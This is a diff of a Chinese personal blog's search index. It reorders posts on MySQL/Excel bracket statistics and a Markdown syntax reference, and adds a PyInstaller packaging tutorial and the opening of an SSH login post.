+    <content><![CDATA[<p><em>本来这个是放在代码碎片系列里的（因为很少做开发了，从2020年初到现在才凑齐6个），当时因为按价格分段，奈何分段太多想出的“偷懒”方法，想单独写一篇文章，可惜篇幅不够。因为前一段时间受朋友之托，临危受命，帮忙做IOS的账单分月（当时并不清楚IOS的财年），刚开始以为没有规律可循，但是后来发现月份都是按照35，28，28天这样排列的，也就是都是7的倍数，觉得可以用之前的方法来实现。这里简单介绍下思路，具体操作根据数据来进行微调。</em></p>
+<h3 id="客单价分布"><a href="#客单价分布" class="headerlink" title="客单价分布"></a>客单价分布</h3><p>最初想的写法和“偷懒”后的想法：<br><img src="/img/20220827/1.png" alt><br>因为这里区间是(0, 20]，(20, 40]……思路就是按照需要统计的字段减去最小的单位数字，然后除以分段区间的公约数后向下取整。如图中字段为金额，减去最小数值0.01元，然后除以20后向下取整。如果金额为0，结果就是-1；如果金额为0.01到20，结果就是0；如果金额是20.01到40，结果就是1。<br>下图是Excel的写法，但是和上面的sql不对应，这是后来的了：<br><img src="/img/20220827/2.png" alt><br>Excel的话，就是在MySQL的计算基础上加1，再乘以分段区间的公约数计算出所在区间。继续以上面的例子举例，结果-1的加1后乘以20，结果为0，不做统计；结果0的加1后乘以20，结果为20，区间(0, 20]；结果2的加1后乘以20，结果为40，区间(20, 40]。通过Excel公式SUMIF来判断所处区间，除了开头和结尾的两个能直接判断外，中间的需要减去之前的数值。有异常数据的时候需要自己判断了，比如金额为负数的订单。<br>这里做了一个简单的例子，可以参考一下：<br><img src="/img/20220827/3.png" alt><br>这里只是提供一个思路，调整区间只要公约数不变，只需要更改Excel区间条件就行了。</p>
+<h3 id="IOS账单分月"><a href="#IOS账单分月" class="headerlink" title="IOS账单分月"></a>IOS账单分月</h3><p>财年（Fiscal Year，财经年度，财政年度，会计财务年度，会计年度），是指公司或国家每年制定预算或计算收入的统计时间。财季是指某一季度的财务状况，财年是指某一完整四个财季的财务状况。但每个国家或其法例所辖的组织各有不同，大抵分成历年制（历年度制,是指财政年度的起止期与年历始末相同，即公历1月1日起至12月31日止）和跨年制（跨日历年度制，是指财政年度起止期与年历始末不相同）两类。<br>AppStore2020账单日历：<br><img src="/img/20220827/4.png" alt><br>Apple财年由四个财季组成，每个季度分别为35天，28天，28天。苹果的财政年度从10月的财政年度开始，这意味着苹果的2020财年从2019年10月开始（包含9月），周天开始，周六结束，并为第一个季度。（深究的话，苹果财年只有364天，所以每5年必须在12账单月增加一周，这里不讨论）<br><img src="/img/20220827/5.png" alt><br>比如我这里限定区间范围，通过<code>YEARWEEK</code>来区分周（默认周天为每周第一天）。<br><img src="/img/20220827/6.png" alt><br>然后通过excel，分别以每5周，4周，4周进行公式填充。<br>这里只是提供一个思路，请以实际情况自行调整，单独通过MySQL不好实现的时候，可以借助下其他工具软件。</p>
 ]]></content>
       <tags>
-        <tag>JavaScript</tag>
-        <tag>二维码</tag>
+        <tag>MySQL</tag>
+        <tag>Excel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Markdown参考</title>
+    <url>/2020/02/04/Markdown%E5%8F%82%E8%80%83/</url>
+    <content><![CDATA[<h1 id="Markdown参考"><a href="#Markdown参考" class="headerlink" title="Markdown参考"></a>Markdown参考</h1><p><em>简单写了一下Markdown常用的语法，供以后参考（不必再去搜索，手动滑稽）</em></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">标题：</span><br><span class="line">使用 # 号标记(可用 = 和 - 标记替换一级和二级标题)</span><br><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br><span class="line">一级标题</span><br><span class="line">===</span><br><span class="line">二级标题</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h1 id="一级标题-1"><a href="#一级标题-1" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题-1"><a href="#二级标题-1" class="headerlink" title="二级标题"></a>二级标题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">图片：</span><br><span class="line">![alt 属性文本](图片地址)</span><br><span class="line">![alt 属性文本](图片地址 &quot;可选标题&quot;)</span><br><span class="line"></span><br><span class="line">![alt 属性文本](https://xuchunlei.top/img/favicon.png)</span><br><span class="line">![alt 属性文本](https://xuchunlei.top/img/favicon.png &quot;可选标题&quot;)</span><br><span class="line">到目前为止，Markdown还没有办法指定图片的宽高，可以使用普通的&lt;img&gt;标签代替</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xuchunlei.top/img/favicon.png" alt="alt 属性文本"><br><img src="https://xuchunlei.top/img/favicon.png" alt="alt 属性文本" title="可选标题"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">*斜体* _斜体_</span><br><span class="line">**粗体**  __粗体__</span><br><span class="line">***粗斜体*** ___粗斜体___</span><br><span class="line">上标：X&lt;sup&gt;u&lt;/sup&gt;，下标：CH&lt;sub&gt;un&lt;/sub&gt;</span><br><span class="line">`高亮`</span><br><span class="line">~~删除线~~ &lt;s&gt;删除线&lt;/s&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br></pre></td></tr></table></figure>
+
+<p><em>斜体</em> <em>斜体</em><br><strong>粗体</strong>  <strong>粗体</strong><br><strong><em>粗斜体</em></strong> <strong><em>粗斜体</em></strong><br>上标：X<sup>u</sup>，下标：CH<sub>un</sub><br><code>高亮</code><br><del>删除线</del> <s>删除线</s><br><u>下划线</u></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分隔线，一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。</span><br><span class="line">你也可以在星号或是减号中间插入空格。</span><br><span class="line">***</span><br><span class="line">* * *</span><br><span class="line">*****</span><br><span class="line">- - -</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>
+
+<hr>
+<hr>
+<hr>
+<hr>
+<hr>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">区块引用：</span><br><span class="line">每行的最前面加上 &gt;</span><br><span class="line">&gt; ## 区块引用（二级标题）</span><br><span class="line">&gt; &gt; 第一层嵌套</span><br><span class="line">&gt; &gt; &gt; * 第二层嵌套1（无序列表）</span><br><span class="line">&gt; &gt; &gt; * 第二层嵌套2（无序列表）</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h2 id="区块引用（二级标题）"><a href="#区块引用（二级标题）" class="headerlink" title="区块引用（二级标题）"></a>区块引用（二级标题）</h2><blockquote>
+<p>第一层嵌套</p>
+<blockquote>
+<ul>
+<li>第二层嵌套1（无序列表）</li>
+<li>第二层嵌套2（无序列表）</li>
+</ul>
+</blockquote>
+</blockquote>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">列表：</span><br><span class="line">无序列表使用星号*、加号+或是减号-作为列表标记</span><br><span class="line">+ 无序列表一</span><br><span class="line">+ 无序列表二</span><br><span class="line">    + 无序嵌套列表二-1</span><br><span class="line">    + 无序嵌套列表二-2</span><br><span class="line">有序列表则使用数字接着一个英文句点（数字并不会影响输出的 HTML 结果）</span><br><span class="line">1. 有序列表一</span><br><span class="line">2. 有序列表二</span><br><span class="line">列表嵌套只需在子列表中的选项添加四个空格</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>无序列表一</li>
+<li>无序列表二<ul>
+<li>无序嵌套列表二-1</li>
+<li>无序嵌套列表二-2</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>有序列表一</li>
+<li>有序列表二</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">链接：</span><br><span class="line">[链接名称](链接地址)或&lt;链接地址&gt;</span><br><span class="line"></span><br><span class="line">[链接](https://xuchunlei.top/2020/02/04/Markdown参考/) 自动链接&lt;https://xuchunlei.top/2020/02/04/Markdown参考/&gt;</span><br><span class="line">[链接带标题](https://xuchunlei.top/2020/02/04/Markdown参考/ &quot;标题&quot;)</span><br><span class="line">锚点链接 隐式链接标记，用变量来代替，可以把它放在文件最后面，就像是注解一样（这里页面显示不对）</span><br><span class="line">[锚点链接 隐式链接标记1][anchor-id]</span><br><span class="line">[锚点链接 隐式链接标记2][anchor-id]</span><br><span class="line">[anchor-id]: https://xuchunlei.top/2020/02/04/Markdown参考/</span><br><span class="line">邮箱1[xuchl@xuchunlei.top](mailto:xuchl@xuchunlei.top) 邮箱2 xuchl@xuchunlei.top</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://xuchunlei.top/2020/02/04/Markdown参考/">链接</a> 自动链接<a href="https://xuchunlei.top/2020/02/04/Markdown参考/">https://xuchunlei.top/2020/02/04/Markdown参考/</a><br><a href="https://xuchunlei.top/2020/02/04/Markdown参考/" title="标题">链接带标题</a><br>[锚点链接 隐式链接标记1][anchor-id]<br>[锚点链接 隐式链接标记2][anchor-id]<br>[anchor-id]: <a href="https://xuchunlei.top/2020/02/04/Markdown参考/">https://xuchunlei.top/2020/02/04/Markdown参考/</a><br>邮箱1<a href="mailto:xuchl@xuchunlei.top">xuchl@xuchunlei.top</a> 邮箱2 <a href="mailto:xuchl@xuchunlei.top">xuchl@xuchunlei.top</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表格：</span><br><span class="line">使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。</span><br><span class="line">:- 设置内容和标题栏居左对齐，:-:居中，-: 右对齐</span><br><span class="line">| 默认 | 左对齐 | 居中 | 右对齐 |</span><br><span class="line">| ---- | :----- | :----: | ----: |</span><br><span class="line">| 单元格 | 单元格 | `单元格` | 单元格 |</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>默认</th>
+<th align="left">左对齐</th>
+<th align="center">居中</th>
+<th align="right">右对齐</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单元格</td>
+<td align="left">单元格</td>
+<td align="center"><code>单元格</code></td>
+<td align="right">单元格</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码：</span><br><span class="line">函数或片段的代码可以用反引号</span><br><span class="line">通过`alert(&apos;Hello World&apos;)`弹出Hello World</span><br><span class="line">代码区块可用四个空格或者一个制表位</span><br><span class="line">    console.log(&quot;Hello world 空格&quot;)</span><br><span class="line">    console.log(&quot;Hello world 空格&quot;)</span><br><span class="line"></span><br><span class="line">	console.log(&quot;Hello world Tab&quot;)</span><br><span class="line">	console.log(&quot;Hello world Tab&quot;)</span><br><span class="line">也可以用代码区域设置符号三个反引号</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>alert(&#39;Hello World&#39;)</code>弹出Hello World</p>
+<pre><code>console.log(&quot;Hello world 空格&quot;)
+console.log(&quot;Hello world 空格&quot;)
+
+console.log(&quot;Hello world Tab&quot;)
+console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 三个反引号后加html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>html代码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Markdown</tag>
       </tags>
   </entry>
   <entry>
@@ -563,97 +654,6 @@
 ]]></content>
       <tags>
         <tag>MySQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Markdown参考</title>
-    <url>/2020/02/04/Markdown%E5%8F%82%E8%80%83/</url>
-    <content><![CDATA[<h1 id="Markdown参考"><a href="#Markdown参考" class="headerlink" title="Markdown参考"></a>Markdown参考</h1><p><em>简单写了一下Markdown常用的语法，供以后参考（不必再去搜索，手动滑稽）</em></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">标题：</span><br><span class="line">使用 # 号标记(可用 = 和 - 标记替换一级和二级标题)</span><br><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br><span class="line">一级标题</span><br><span class="line">===</span><br><span class="line">二级标题</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h1 id="一级标题-1"><a href="#一级标题-1" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题-1"><a href="#二级标题-1" class="headerlink" title="二级标题"></a>二级标题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">图片：</span><br><span class="line">![alt 属性文本](图片地址)</span><br><span class="line">![alt 属性文本](图片地址 &quot;可选标题&quot;)</span><br><span class="line"></span><br><span class="line">![alt 属性文本](https://xuchunlei.top/img/favicon.png)</span><br><span class="line">![alt 属性文本](https://xuchunlei.top/img/favicon.png &quot;可选标题&quot;)</span><br><span class="line">到目前为止，Markdown还没有办法指定图片的宽高，可以使用普通的&lt;img&gt;标签代替</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://xuchunlei.top/img/favicon.png" alt="alt 属性文本"><br><img src="https://xuchunlei.top/img/favicon.png" alt="alt 属性文本" title="可选标题"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">*斜体* _斜体_</span><br><span class="line">**粗体**  __粗体__</span><br><span class="line">***粗斜体*** ___粗斜体___</span><br><span class="line">上标：X&lt;sup&gt;u&lt;/sup&gt;，下标：CH&lt;sub&gt;un&lt;/sub&gt;</span><br><span class="line">`高亮`</span><br><span class="line">~~删除线~~ &lt;s&gt;删除线&lt;/s&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br></pre></td></tr></table></figure>
-
-<p><em>斜体</em> <em>斜体</em><br><strong>粗体</strong>  <strong>粗体</strong><br><strong><em>粗斜体</em></strong> <strong><em>粗斜体</em></strong><br>上标：X<sup>u</sup>，下标：CH<sub>un</sub><br><code>高亮</code><br><del>删除线</del> <s>删除线</s><br><u>下划线</u></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分隔线，一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。</span><br><span class="line">你也可以在星号或是减号中间插入空格。</span><br><span class="line">***</span><br><span class="line">* * *</span><br><span class="line">*****</span><br><span class="line">- - -</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>
-
-<hr>
-<hr>
-<hr>
-<hr>
-<hr>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">区块引用：</span><br><span class="line">每行的最前面加上 &gt;</span><br><span class="line">&gt; ## 区块引用（二级标题）</span><br><span class="line">&gt; &gt; 第一层嵌套</span><br><span class="line">&gt; &gt; &gt; * 第二层嵌套1（无序列表）</span><br><span class="line">&gt; &gt; &gt; * 第二层嵌套2（无序列表）</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<h2 id="区块引用（二级标题）"><a href="#区块引用（二级标题）" class="headerlink" title="区块引用（二级标题）"></a>区块引用（二级标题）</h2><blockquote>
-<p>第一层嵌套</p>
-<blockquote>
-<ul>
-<li>第二层嵌套1（无序列表）</li>
-<li>第二层嵌套2（无序列表）</li>
-</ul>
-</blockquote>
-</blockquote>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">列表：</span><br><span class="line">无序列表使用星号*、加号+或是减号-作为列表标记</span><br><span class="line">+ 无序列表一</span><br><span class="line">+ 无序列表二</span><br><span class="line">    + 无序嵌套列表二-1</span><br><span class="line">    + 无序嵌套列表二-2</span><br><span class="line">有序列表则使用数字接着一个英文句点（数字并不会影响输出的 HTML 结果）</span><br><span class="line">1. 有序列表一</span><br><span class="line">2. 有序列表二</span><br><span class="line">列表嵌套只需在子列表中的选项添加四个空格</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>无序列表一</li>
-<li>无序列表二<ul>
-<li>无序嵌套列表二-1</li>
-<li>无序嵌套列表二-2</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li>有序列表一</li>
-<li>有序列表二</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">链接：</span><br><span class="line">[链接名称](链接地址)或&lt;链接地址&gt;</span><br><span class="line"></span><br><span class="line">[链接](https://xuchunlei.top/2020/02/04/Markdown参考/) 自动链接&lt;https://xuchunlei.top/2020/02/04/Markdown参考/&gt;</span><br><span class="line">[链接带标题](https://xuchunlei.top/2020/02/04/Markdown参考/ &quot;标题&quot;)</span><br><span class="line">锚点链接 隐式链接标记，用变量来代替，可以把它放在文件最后面，就像是注解一样（这里页面显示不对）</span><br><span class="line">[锚点链接 隐式链接标记1][anchor-id]</span><br><span class="line">[锚点链接 隐式链接标记2][anchor-id]</span><br><span class="line">[anchor-id]: https://xuchunlei.top/2020/02/04/Markdown参考/</span><br><span class="line">邮箱1[xuchl@xuchunlei.top](mailto:xuchl@xuchunlei.top) 邮箱2 xuchl@xuchunlei.top</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://xuchunlei.top/2020/02/04/Markdown参考/">链接</a> 自动链接<a href="https://xuchunlei.top/2020/02/04/Markdown参考/">https://xuchunlei.top/2020/02/04/Markdown参考/</a><br><a href="https://xuchunlei.top/2020/02/04/Markdown参考/" title="标题">链接带标题</a><br>[锚点链接 隐式链接标记1][anchor-id]<br>[锚点链接 隐式链接标记2][anchor-id]<br>[anchor-id]: <a href="https://xuchunlei.top/2020/02/04/Markdown参考/">https://xuchunlei.top/2020/02/04/Markdown参考/</a><br>邮箱1<a href="mailto:xuchl@xuchunlei.top">xuchl@xuchunlei.top</a> 邮箱2 <a href="mailto:xuchl@xuchunlei.top">xuchl@xuchunlei.top</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表格：</span><br><span class="line">使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。</span><br><span class="line">:- 设置内容和标题栏居左对齐，:-:居中，-: 右对齐</span><br><span class="line">| 默认 | 左对齐 | 居中 | 右对齐 |</span><br><span class="line">| ---- | :----- | :----: | ----: |</span><br><span class="line">| 单元格 | 单元格 | `单元格` | 单元格 |</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>默认</th>
-<th align="left">左对齐</th>
-<th align="center">居中</th>
-<th align="right">右对齐</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>单元格</td>
-<td align="left">单元格</td>
-<td align="center"><code>单元格</code></td>
-<td align="right">单元格</td>
-</tr>
-</tbody></table>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码：</span><br><span class="line">函数或片段的代码可以用反引号</span><br><span class="line">通过`alert(&apos;Hello World&apos;)`弹出Hello World</span><br><span class="line">代码区块可用四个空格或者一个制表位</span><br><span class="line">    console.log(&quot;Hello world 空格&quot;)</span><br><span class="line">    console.log(&quot;Hello world 空格&quot;)</span><br><span class="line"></span><br><span class="line">	console.log(&quot;Hello world Tab&quot;)</span><br><span class="line">	console.log(&quot;Hello world Tab&quot;)</span><br><span class="line">也可以用代码区域设置符号三个反引号</span><br></pre></td></tr></table></figure>
-
-<p>通过<code>alert(&#39;Hello World&#39;)</code>弹出Hello World</p>
-<pre><code>console.log(&quot;Hello world 空格&quot;)
-console.log(&quot;Hello world 空格&quot;)
-
-console.log(&quot;Hello world Tab&quot;)
-console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 三个反引号后加html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>html代码<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Markdown</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL借助Excel快速区间分段统计（客单价分布 IOS账单分月）</title>
-    <url>/2022/08/27/MySQL%E5%80%9F%E5%8A%A9Excel%E5%BF%AB%E9%80%9F%E5%8C%BA%E9%97%B4%E5%88%86%E6%AE%B5%E7%BB%9F%E8%AE%A1%EF%BC%88%E5%AE%A2%E5%8D%95%E4%BB%B7%E5%88%86%E5%B8%83%20IOS%E8%B4%A6%E5%8D%95%E5%88%86%E6%9C%88%EF%BC%89/</url>
-    <content><![CDATA[<p><em>本来这个是放在代码碎片系列里的（因为很少做开发了，从2020年初到现在才凑齐6个），当时因为按价格分段，奈何分段太多想出的“偷懒”方法，想单独写一篇文章，可惜篇幅不够。因为前一段时间受朋友之托，临危受命，帮忙做IOS的账单分月（当时并不清楚IOS的财年），刚开始以为没有规律可循，但是后来发现月份都是按照35，28，28天这样排列的，也就是都是7的倍数，觉得可以用之前的方法来实现。这里简单介绍下思路，具体操作根据数据来进行微调。</em></p>
-<h3 id="客单价分布"><a href="#客单价分布" class="headerlink" title="客单价分布"></a>客单价分布</h3><p>最初想的写法和“偷懒”后的想法：<br><img src="/img/20220827/1.png" alt><br>因为这里区间是(0, 20]，(20, 40]……思路就是按照需要统计的字段减去最小的单位数字，然后除以分段区间的公约数后向下取整。如图中字段为金额，减去最小数值0.01元，然后除以20后向下取整。如果金额为0，结果就是-1；如果金额为0.01到20，结果就是0；如果金额是20.01到40，结果就是1。<br>下图是Excel的写法，但是和上面的sql不对应，这是后来的了：<br><img src="/img/20220827/2.png" alt><br>Excel的话，就是在MySQL的计算基础上加1，再乘以分段区间的公约数计算出所在区间。继续以上面的例子举例，结果-1的加1后乘以20，结果为0，不做统计；结果0的加1后乘以20，结果为20，区间(0, 20]；结果2的加1后乘以20，结果为40，区间(20, 40]。通过Excel公式SUMIF来判断所处区间，除了开头和结尾的两个能直接判断外，中间的需要减去之前的数值。有异常数据的时候需要自己判断了，比如金额为负数的订单。<br>这里做了一个简单的例子，可以参考一下：<br><img src="/img/20220827/3.png" alt><br>这里只是提供一个思路，调整区间只要公约数不变，只需要更改Excel区间条件就行了。</p>
-<h3 id="IOS账单分月"><a href="#IOS账单分月" class="headerlink" title="IOS账单分月"></a>IOS账单分月</h3><p>财年（Fiscal Year，财经年度，财政年度，会计财务年度，会计年度），是指公司或国家每年制定预算或计算收入的统计时间。财季是指某一季度的财务状况，财年是指某一完整四个财季的财务状况。但每个国家或其法例所辖的组织各有不同，大抵分成历年制（历年度制,是指财政年度的起止期与年历始末相同，即公历1月1日起至12月31日止）和跨年制（跨日历年度制，是指财政年度起止期与年历始末不相同）两类。<br>AppStore2020账单日历：<br><img src="/img/20220827/4.png" alt><br>Apple财年由四个财季组成，每个季度分别为35天，28天，28天。苹果的财政年度从10月的财政年度开始，这意味着苹果的2020财年从2019年10月开始（包含9月），周天开始，周六结束，并为第一个季度。（深究的话，苹果财年只有364天，所以每5年必须在12账单月增加一周，这里不讨论）<br><img src="/img/20220827/5.png" alt><br>比如我这里限定区间范围，通过<code>YEARWEEK</code>来区分周（默认周天为每周第一天）。<br><img src="/img/20220827/6.png" alt><br>然后通过excel，分别以每5周，4周，4周进行公式填充。<br>这里只是提供一个思路，请以实际情况自行调整，单独通过MySQL不好实现的时候，可以借助下其他工具软件。</p>
-]]></content>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Excel</tag>
       </tags>
   </entry>
   <entry>
@@ -878,6 +878,91 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
 ]]></content>
       <tags>
         <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python程序使用Pyinstaller打包成exe可执行文件</title>
+    <url>/2023/10/23/Python%E7%A8%8B%E5%BA%8F%E4%BD%BF%E7%94%A8Pyinstaller%E6%89%93%E5%8C%85%E6%88%90exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="Python程序使用Pyinstaller打包成exe可执行文件"><a href="#Python程序使用Pyinstaller打包成exe可执行文件" class="headerlink" title="Python程序使用Pyinstaller打包成exe可执行文件"></a>Python程序使用Pyinstaller打包成exe可执行文件</h2><p><em>给朋友写过几个工具，VBA和Python都有，不过朋友更喜欢Python，于是又出了一个Python版。为了方便对方运行，就又打包成exe可执行文件</em></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>为什么要打包成exe可执行文件，主要是为了在没有装Python的电脑上运行，以及方便不懂编程的小伙伴运行。打包成exe可执行文件的话，Windows平台差不多都能运行，只发一个exe文件就好（前提是打包成一个exe，而不是文件夹）。<br>Pyinstaller的详细介绍可以去<a href="https://pyinstaller.org/en/stable/" target="_blank" rel="noopener"><code>Pyinstaller官网</code></a>查看，这里只是简单介绍一下Pyinstaller，实际使用上基本用几个参数就好。</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Windows直接在cmd中用pip安装就好，如果安装较慢可以切换国内源试试。<br><code>pip install pyinstaller</code></p>
+<p>我这里以前安装过了，当然也可用用<code>pip install --upgrade pyinstaller</code>更新一下版本。下面就是一个简单的打包操做，打包过程时间稍微有点长<br><img src="/img/20231023/1.png" alt></p>
+<h3 id="主要命令参数"><a href="#主要命令参数" class="headerlink" title="主要命令参数"></a>主要命令参数</h3><p>Pyinstaller使用的时候注意参数大小写，一般有两种参数写法，比如查看版本可以使用<code>-v</code>或者<code>--version</code>。<br><code>-h</code>或者<code>--help</code>查看Pyinstaller的帮助信息，我为了方便（偷懒），全部使用简写的参数形式<br><img src="/img/20231023/2.png" alt></p>
+<p><code>-F</code> 创建一个可执行文件，写小工具的时候推荐<br>执行<code>pyinstaller -F pyReadEx.py</code>后效果如下，会成成build，dist文件夹以及扩展名为spec的文件，exe可执行文件会在dist目录下<br><img src="/img/20231023/3.png" alt><br><code>-D</code> 默认参数，创建一个文件夹包含可执行文件<br><img src="/img/20231023/4.png" alt></p>
+<p><code>-i</code> 设置icon图标</p>
+<p><code>-n</code> 设置名字，省略的话直接使用第一个py脚本文件名<br><img src="/img/20231023/5.png" alt></p>
+<p><code>-w</code> 使用窗口执行，不会打开控制台（Windows专用）。比如我的脚本有个print提示，使用此参数后就看不到了<br><code>-c</code> 默认参数，使用控制台执行（Windows专用）</p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>只是写小工具的话，上面的参数够用了。不过有时打包成exe的话，文件会很大，貌似Pyinstaller打包的时候很多不必要的库也会打包进去，可以考虑弄一个纯净的Python环境打包。现在Windows系统基本都是64位，Python也是64位的，基本不考虑32位系统，如果需要32位的exe的话，可以用32的Python进行打包。</p>
+]]></content>
+      <tags>
+        <tag>Python</tag>
+        <tag>Pyinstaller</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSH远程登录</title>
+    <url>/2021/06/25/SSH%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="SSH远程登录"><a href="#SSH远程登录" class="headerlink" title="SSH远程登录"></a>SSH远程登录</h1><p><em>起因是服务器在儿童节那天数据库连不上了，原因是中了之前横行的勒索病毒的变种……然后就有了后来的各种加强：windos变更为linux,通过SSH连接等等，这里就简单梳理一下SSH的相关知识</em><br><img src="/img/20210625/1.jpg" alt></p>
